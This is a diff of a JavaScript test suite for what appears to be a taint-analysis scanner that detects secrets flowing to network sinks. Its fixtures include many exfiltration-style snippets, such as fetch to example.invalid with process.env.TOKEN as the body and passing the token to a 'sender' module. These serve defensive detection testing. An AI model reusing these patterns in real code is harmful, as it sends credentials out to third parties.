@@ -175,7 +175,7 @@ test('unsupported semantics, dynamic require and unknown APIs are incomplete', t
     'for (;;) {}', 'const object={get token(){return process.env.TOKEN}};',
     'const fs=require("node:fs");', 'eval("1");',
     'const send=require("sender"); send.call(null, process.env.TOKEN);',
-    'const {send}=require("sender");', 'let x=1; x=2;',
+    'const {send}=require("sender");', 'const x=1; x=2;',
     'const f=async()=>1;', 'new Function("return 1")();',
     'JSON.stringify({toJSON:()=>fetch("https://example.invalid",{body:process.env.TOKEN})});',
     'const object={toString:()=>fetch("https://example.invalid",{body:process.env.TOKEN})}; const value=""+object;',
@@ -288,4 +288,126 @@ test('vendored parser matches recorded provenance hash', () => {
   const provenance = JSON.parse(fs.readFileSync(new URL('provenance.json', folder)));
   const hash = createHash('sha256').update(fs.readFileSync(new URL('acorn.cjs', folder))).digest('hex');
   assert.equal(hash, provenance.sha256);
+});
+
+test('var hoisting, redeclarations, local assignment, and block shadowing preserve flows', t => {
+  for (const entry of [
+    'var send=require("sender"); var token; token=process.env.TOKEN; var token; send(token);',
+    'var send=require("sender"); if(true){var token=process.env.TOKEN} send(token);',
+    'let token=process.env.TOKEN; {let token="public";} require("sender")(token);',
+    'function pass(value){var value; value="prefix:"+value; return value} require("sender")(pass(process.env.TOKEN));',
+  ]) assert.equal(fixture(t, { entry }).scan().verdict, 'review', entry);
+  for (const entry of [
+    'var send=require("sender"); send(token); var token=process.env.TOKEN;',
+    'var send=require("sender"); var token=process.env.TOKEN; token="public"; send(token);',
+    'let token=process.env.TOKEN; {let token="public"; require("sender")(token);}',
+    'function pass(value){var process; return value} require("sender")(pass("public"));',
+  ]) assert.equal(fixture(t, { entry }).scan().verdict, 'no-flow-found', entry);
+});
+
+test('known branches, early returns and short circuits do not evaluate dead paths', t => {
+  const cases = [
+    ['if(false) require("sender")(process.env.TOKEN);', 'no-flow-found'],
+    ['if(true) require("sender")(process.env.TOKEN);', 'review'],
+    ['const send=require("sender"); false && send(process.env.TOKEN); true || mystery(); "value" ?? mystery();', 'no-flow-found'],
+    ['const send=require("sender"); true && send(process.env.TOKEN);', 'review'],
+    ['const value=false ? process.env.TOKEN : "public"; require("sender")(value);', 'no-flow-found'],
+    ['function f(){if(true){return "public";} return process.env.TOKEN;} require("sender")(f());', 'no-flow-found'],
+    ['function f(){if(false){return "public";} return process.env.TOKEN;} require("sender")(f());', 'review'],
+    ['function unused(){for(;;){}} require("sender")("public");', 'no-flow-found'],
+  ];
+  for (const [entry, verdict] of cases) assert.equal(fixture(t, { entry }).scan().verdict, verdict, entry);
+});
+
+test('unknown branch returns and continuations preserve both possible flows with explicit uncertainty', t => {
+  for (const helper of [
+    'module.exports=function(v){if(process.env.MODE){return "public";} return v;};',
+    'module.exports=function(v){if(process.env.MODE){return v;} return "public";};',
+    'module.exports=function(v){var x="public"; if(process.env.MODE){x=v;} return x;};',
+    'module.exports=function(v){var x=v; if(process.env.MODE){x="public";} return x;};',
+  ]) {
+    const r = fixture(t, { helper, entry: 'const value=require("sender")(process.env.TOKEN);fetch("https://example.invalid",{body:value});' }).scan();
+    assert.equal(r.verdict, 'incomplete', helper);
+    assert.ok(hasGap(r, 'uncertain-control-flow'));
+    assert.ok(r.findings.some(f => f.trace[0].label === 'process.env.TOKEN'), helper);
+  }
+});
+
+test('conditional expressions, short-circuit effects, and callable alternatives retain taint', t => {
+  for (const entry of [
+    'let x="public"; const y=process.env.FLAG ? (x=process.env.TOKEN) : (x="public");require("sender")(x);',
+    'let x="public"; process.env.FLAG && (x=process.env.TOKEN);require("sender")(x);',
+    'const send=process.env.FLAG ? require("sender") : value=>undefined;send(process.env.TOKEN);',
+    'const send=process.env.FLAG ? value=>undefined : require("sender");send(process.env.TOKEN);',
+  ]) {
+    const r = fixture(t, { entry }).scan();
+    assert.equal(r.verdict, 'incomplete', entry); assert.ok(r.findings.length, entry);
+  }
+});
+
+test('branch evaluation does not leak assignment state from one alternative into another', t => {
+  const r = fixture(t, { entry: 'var x="public";if(process.env.FLAG){x=process.env.TOKEN;}else{require("sender")(x);}' }).scan();
+  assert.equal(r.verdict, 'incomplete'); assert.equal(r.findings.length, 0);
+});
+
+test('branch merges preserve closures, exported objects and distinct return values', t => {
+  const cases = [
+    'var out="public";var read=()=>out;var unused=process.env.FLAG ? (out=process.env.TOKEN) : (out="public");require("sender")(read());',
+    'if(process.env.FLAG){module.exports=process.env.TOKEN;}else{module.exports="public";}fetch("https://example.invalid",{body:module.exports});',
+    'function choose(){if(process.env.FLAG){var token=process.env.TOKEN;return ()=>token;}return ()=>"public";}const get=choose();require("sender")(get());',
+  ];
+  for (const entry of cases) {
+    const r = fixture(t, { entry }).scan();
+    assert.equal(r.verdict, 'incomplete', entry); assert.ok(r.findings.length, entry);
+  }
+});
+
+test('primitive arithmetic, comparison, conversion and Math calculations select the correct branches', t => {
+  const r = fixture(t, { entry: 'var n=1000; n*=2; const out=Math.round(n/1000)+"s"; if(out==="2s" && typeof n==="number" && isFinite(n)){require("sender")(process.env.TOKEN);}' }).scan();
+  assert.equal(r.verdict, 'review');
+  assert.equal(fixture(t, { entry: 'const n=Number("2");if(n!==2 || typeof "text"!=="string"){require("sender")(process.env.TOKEN);}' }).scan().verdict, 'no-flow-found');
+});
+
+test('outer-scope writes, Annex B declarations and exceptions remain incomplete', t => {
+  for (const entry of [
+    'let x="public"; function f(){x=process.env.TOKEN;} f(); require("sender")(x);',
+    'if(false){function fetch(){}} fetch("https://example.invalid");',
+    'throw "stop"; require("sender")(process.env.TOKEN);',
+  ]) assert.equal(fixture(t, { entry }).scan().verdict, 'incomplete', entry);
+});
+
+test('path and computed value growth are bounded', t => {
+  const entry = 'const a=process.env.A?1:2;const b=process.env.B?3:4;';
+  assert.ok(hasGap(fixture(t, { entry }).scan({ limits: { maxPaths: 1 } }), 'path-budget'));
+  const doubling = 'var x="1234567890";' + 'x=x+x;'.repeat(16);
+  assert.ok(hasGap(fixture(t, { entry: doubling }).scan(), 'value-budget'));
+});
+
+test('typeof unknown host globals cannot suppress a sensitive branch', t => {
+  const r = fixture(t, { entry: 'if(typeof Buffer!=="undefined"){require("sender")(process.env.TOKEN);}' }).scan();
+  assert.equal(r.verdict, 'incomplete'); assert.ok(hasGap(r, 'unmodeled-global'));
+  assert.ok(r.findings.length);
+  assert.equal(fixture(t, { entry: 'if(typeof fetch==="function"){require("sender")(process.env.TOKEN);}' }).scan().verdict, 'review');
+});
+
+test('pinned real ms package formats numbers across the dependency boundary', t => {
+  const folder = new URL('./fixtures/vendor/ms-2.1.3/', import.meta.url);
+  const manifest = JSON.parse(fs.readFileSync(new URL('package.json', folder)));
+  const source = fs.readFileSync(new URL('index.js', folder), 'utf8');
+  const cases = [
+    ['const ms=require("ms"); if(ms(2000)==="2s"){require("sender")(process.env.TOKEN);}', 'review'],
+    ['const ms=require("ms"); if(ms(2000)==="2h"){require("sender")(process.env.TOKEN);}', 'no-flow-found'],
+    ['const ms=require("ms"); require("sender")(ms(2000));', 'no-flow-found'],
+    ['const ms=require("ms"); require("sender")(process.env.TOKEN+ms(2000));', 'review'],
+    ['const ms=require("ms"); if(ms(2000,{long:true})==="2 seconds"){require("sender")(process.env.TOKEN);}', 'review'],
+    ['const ms=require("ms"); require("sender")(ms("2h"));', 'incomplete'],
+  ];
+  for (const [entry, expected] of cases) {
+    const f = fixture(t, { entry });
+    f.addPackage('node_modules/ms', 'ms', '2.1.3', source, manifest);
+    const r = f.scan();
+    assert.equal(r.verdict, expected, JSON.stringify({ entry, gaps: r.gaps }));
+  }
+  const provenance = JSON.parse(fs.readFileSync(new URL('provenance.json', folder)));
+  for (const [file, expected] of Object.entries(provenance.files)) assert.equal(createHash('sha256').update(fs.readFileSync(new URL(file, folder))).digest('hex'), expected);
 });
